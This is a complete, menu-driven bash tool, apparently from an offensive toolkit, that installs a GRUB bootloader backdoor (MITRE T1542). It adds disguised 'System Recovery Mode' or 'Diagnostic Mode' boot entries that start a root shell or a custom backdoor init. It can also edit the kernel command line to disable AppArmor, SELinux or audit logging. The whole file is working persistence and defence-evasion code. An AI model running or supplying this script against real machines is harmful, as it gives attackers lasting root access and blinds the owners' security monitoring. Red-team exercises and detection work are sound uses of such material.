#!/bin/bash
#
# GRUB Bootloader Backdoor (T1542)
# Inject hidden GRUB entries or modify kernel cmdline
#

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'; NC='\033[0m'
MARKER="d3m0n_grub"

echo -e "${CYAN}"
echo "  ╔═══════════════════════════════════════════════════════╗"
echo "  ║         GRUB Bootloader Backdoor (T1542)              ║"
echo "  ║   Hidden GRUB entries + kernel cmdline modification    ║"
echo "  ╚═══════════════════════════════════════════════════════╝"
echo -e "${NC}"

echo -e "  ${CYAN}[1]${NC} Add hidden GRUB entry (init=/bin/bash single-user)"
echo -e "  ${CYAN}[2]${NC} Add hidden GRUB entry (custom init command)"
echo -e "  ${CYAN}[3]${NC} Modify kernel cmdline (disable security modules)"
echo -e "  ${CYAN}[4]${NC} View current GRUB config"
echo -e "  ${CYAN}[5]${NC} Cleanup"
echo ""
read -p "Choice [1-5]: " OPT

GRUB_D="/etc/grub.d"
GRUB_DEFAULT="/etc/default/grub"

update_grub_cfg() {
    if command -v update-grub >/dev/null 2>&1; then
        update-grub 2>&1 | tail -3
    elif command -v grub2-mkconfig >/dev/null 2>&1; then
        grub2-mkconfig -o /boot/grub2/grub.cfg 2>&1 | tail -3
    elif command -v grub-mkconfig >/dev/null 2>&1; then
        grub-mkconfig -o /boot/grub/grub.cfg 2>&1 | tail -3
    else
        echo -e "${RED}[-] No grub-mkconfig found${NC}"
        return 1
    fi
}

get_kernel_and_root() {
    KERNEL=$(ls /boot/vmlinuz-* 2>/dev/null | sort -V | tail -1)
    INITRD=$(ls /boot/initrd.img-* 2>/dev/null | sort -V | tail -1)
    [[ -z "$INITRD" ]] && INITRD=$(ls /boot/initramfs-* 2>/dev/null | sort -V | tail -1)
    ROOT_DEV=$(findmnt / -no SOURCE 2>/dev/null || grep " / " /etc/fstab | awk '{print $1}')
}

case "$OPT" in
    1)
        get_kernel_and_root

        GRUB_ENTRY="${GRUB_D}/41_d3m0n_recovery"
        cat > "$GRUB_ENTRY" << EOF
#!/bin/sh
# ${MARKER}
exec tail -n +3 \$0

menuentry 'System Recovery Mode' --class os --unrestricted {
    set root='(hd0,1)'
    linux ${KERNEL} root=${ROOT_DEV} ro init=/bin/bash
    $([ -n "$INITRD" ] && echo "initrd ${INITRD}")
}
EOF
        chmod 755 "$GRUB_ENTRY"

        echo -e "${YELLOW}[*] Updating GRUB config...${NC}"
        update_grub_cfg

        echo -e "${GREEN}[+] Hidden GRUB entry added: 'System Recovery Mode'${NC}"
        echo -e "${GREEN}[+] Boots to root shell (init=/bin/bash)${NC}"
        echo -e "${YELLOW}[*] Select at boot: Advanced options → System Recovery Mode${NC}"
        ;;
    2)
        get_kernel_and_root
        read -p "Custom init path (e.g. /path/to/backdoor): " CUSTOM_INIT
        read -p "Menu entry name [Diagnostic Mode]: " ENTRY_NAME
        ENTRY_NAME="${ENTRY_NAME:-Diagnostic Mode}"

        GRUB_ENTRY="${GRUB_D}/41_d3m0n_custom"
        cat > "$GRUB_ENTRY" << EOF
#!/bin/sh
# ${MARKER}
exec tail -n +3 \$0

menuentry '${ENTRY_NAME}' --class os --unrestricted {
    set root='(hd0,1)'
    linux ${KERNEL} root=${ROOT_DEV} ro init=${CUSTOM_INIT}
    $([ -n "$INITRD" ] && echo "initrd ${INITRD}")
}
EOF
        chmod 755 "$GRUB_ENTRY"

        echo -e "${YELLOW}[*] Updating GRUB config...${NC}"
        update_grub_cfg

        echo -e "${GREEN}[+] Custom GRUB entry added: '${ENTRY_NAME}'${NC}"
        ;;
    3)
        echo -e "${YELLOW}[*] Current GRUB_CMDLINE_LINUX:${NC}"
        grep "^GRUB_CMDLINE_LINUX=" "$GRUB_DEFAULT" 2>/dev/null

        echo ""
        echo -e "  ${CYAN}[a]${NC} Disable AppArmor (apparmor=0)"
        echo -e "  ${CYAN}[b]${NC} Disable SELinux (selinux=0)"
        echo -e "  ${CYAN}[c]${NC} Disable audit (audit=0)"
        echo -e "  ${CYAN}[d]${NC} Enable init debug (init=/bin/bash)"
        echo -e "  ${CYAN}[e]${NC} Custom parameter"
        read -p "Choice [a]: " PCHOICE
        PCHOICE="${PCHOICE:-a}"

        case "$PCHOICE" in
            a) PARAM="apparmor=0" ;;
            b) PARAM="selinux=0" ;;
            c) PARAM="audit=0" ;;
            d) PARAM="init=/bin/bash" ;;
            e) read -p "Parameter: " PARAM ;;
            *) echo "Invalid"; exit 1 ;;
        esac

        # Backup
        cp "$GRUB_DEFAULT" "${GRUB_DEFAULT}.d3m0n.bak" 2>/dev/null

        CURRENT=$(grep "^GRUB_CMDLINE_LINUX_DEFAULT=" "$GRUB_DEFAULT" | sed 's/GRUB_CMDLINE_LINUX_DEFAULT="//' | sed 's/"$//')
        if [[ -z "$CURRENT" ]]; then
            CURRENT=$(grep "^GRUB_CMDLINE_LINUX=" "$GRUB_DEFAULT" | sed 's/GRUB_CMDLINE_LINUX="//' | sed 's/"$//')
            sed -i "s|^GRUB_CMDLINE_LINUX=\".*\"|GRUB_CMDLINE_LINUX=\"${CURRENT} ${PARAM}\"|" "$GRUB_DEFAULT"
        else
            sed -i "s|^GRUB_CMDLINE_LINUX_DEFAULT=\".*\"|GRUB_CMDLINE_LINUX_DEFAULT=\"${CURRENT} ${PARAM}\"|" "$GRUB_DEFAULT"
        fi

        echo -e "${YELLOW}[*] Updating GRUB config...${NC}"
        update_grub_cfg

        echo -e "${GREEN}[+] Kernel parameter added: ${PARAM}${NC}"
        echo -e "${YELLOW}[*] Takes effect on next reboot${NC}"
        ;;
    4)
        echo -e "${YELLOW}[*] GRUB default config:${NC}"
        cat "$GRUB_DEFAULT" 2>/dev/null
        echo ""
        echo -e "${YELLOW}[*] Custom entries in ${GRUB_D}:${NC}"
        ls -la "${GRUB_D}"/41_d3m0n_* 2>/dev/null || echo "  None"
        ;;
    5)
        echo -e "${YELLOW}[*] Removing D3m0n GRUB entries...${NC}"
        rm -f "${GRUB_D}"/41_d3m0n_* 2>/dev/null

        if [[ -f "${GRUB_DEFAULT}.d3m0n.bak" ]]; then
            cp "${GRUB_DEFAULT}.d3m0n.bak" "$GRUB_DEFAULT"
            rm -f "${GRUB_DEFAULT}.d3m0n.bak"
            echo -e "  Restored original GRUB defaults"
        fi

        echo -e "${YELLOW}[*] Updating GRUB config...${NC}"
        update_grub_cfg

        echo -e "${GREEN}[+] Cleanup done${NC}"
        ;;
    *)
        echo "Invalid option"
        ;;
esac
